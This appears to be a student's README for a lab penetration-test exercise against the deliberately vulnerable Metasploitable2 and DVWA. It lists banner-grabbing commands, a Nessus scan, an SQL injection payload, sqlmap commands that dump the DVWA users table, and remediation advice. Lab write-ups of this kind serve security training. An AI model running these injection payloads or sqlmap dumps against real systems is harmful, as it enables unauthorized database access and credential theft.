Full VAPT Workflow — Week  2 
Attacker: Kali Linux (192.168.137.128)
Targets: Metasploitable2 / DVWA 
DVWA Web UI: http://127.0.0.1/dvwa/ (default creds: admin / password; set Security -> Low for testing)

Summary
Short VAPT: reconnaissance -> Nessus scan -> manual validation & exploit (SQLi via sqlmap) -> evidence collection -> report.
Key findings and evidence are in the reports/ folder.

Key findings (summary)
- SQL Injection (DVWA, id parameter) — validated and exploited (authentication bypass & user dump).
- High/critical host issues on 192.168.137.129 — Tomcat, bind shell, anonymous FTP, weak credentials, outdated services (see VAPT_T2_Report.pdf).

Quick workflow 
1. Prep
   - Save written authorization to docs/authorization.txt.
   - Workspace:
     mkdir -p ~/cyart-vapt-team/Week2/
     cd ~/cyart-vapt-team/Week2
     echo "VAPT start: $(date --rfc-3339=seconds)" | tee -a "$LOG"

2. Recon
     nc -vn 192.168.137.129 21 < /dev/null 2>&1 | tee scans/ftp_banner.txt
     curl -I http://192.168.137.129/ 2>&1 | tee scans/http_banner.txt

3. Nessus Scan
   - Create & run a Nessus scan for <DVWA_IP> -> export PDF/CSV to reports/.
   - See exported Nessus evidence in VAPT_T2_Report.pdf.

4. Validate & Exploit (SQLi)
   - Set DVWA Security -> Low.
   - Quick PoC payloads:
     1' OR '1'='1
   - Automated extraction:
     sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --dbs
     sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --dump --batch -o captures/sqlmap_dump

5. Post-Exploitation & Evidence
   - fetched the file ppasswd_from_target.txt
   - Screenshots.

6. Reporting
   - reports/Capstone_Project_Report.pdf (PTES technical summary focused on SQLi)
   - reports/VAPT_T2_Report.pdf (Nessus/Nmap/Nikto results)

7. Remediation & Verification
   - SQLi: parameterized queries, server-side validation, suppress DB error messages, least-privilege DB accounts.
   - After fixes: re-run Nessus and sqlmap; save verification screenshots/logs to reports/.

8. Repo Structure & Submission
Week2/
   Outputs/
         Evidences/
         Nikto/
         Nmap/
         Reconfail/ 
   screenshots/
Capstone_project_report.pdf
VAPT_T2_report.pdf
  README.txt
